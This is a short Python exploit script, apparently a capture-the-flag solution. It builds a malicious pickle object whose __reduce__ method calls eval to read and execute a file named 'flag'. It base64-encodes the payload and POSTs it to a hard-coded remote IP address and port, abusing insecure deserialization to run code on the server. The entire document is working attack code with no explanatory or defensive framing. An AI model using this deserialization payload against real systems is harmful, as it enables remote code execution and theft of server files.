import requests
import pickle
import base64
import os
import urllib
import werkzeug.debug

URL='http://34.107.35.141:30746/'

class Exploit():
	def __reduce__(self):
		return (eval, ('eval(open("flag","r").read())', ))

data_string=pickle.dumps(Exploit(),protocol=1)
print(base64.b64encode(data_string))

response=requests.post(url=URL,data=base64.b64encode(data_string).decode())
if response.status_code==200:
    print(response.text)
else:
    print(f'Status code:{response.status_code}')
    print(response.text)